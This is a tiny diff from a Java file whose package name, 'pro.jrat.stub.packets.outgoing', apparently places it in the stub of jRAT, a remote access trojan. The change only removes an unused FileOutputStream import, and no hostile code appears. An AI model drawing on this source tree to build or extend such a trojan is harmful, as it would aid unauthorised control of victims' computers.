@@ -2,7 +2,6 @@ package pro.jrat.stub.packets.outgoing;
 
 import java.io.ByteArrayInputStream;
 import java.io.DataOutputStream;
-import java.io.FileOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
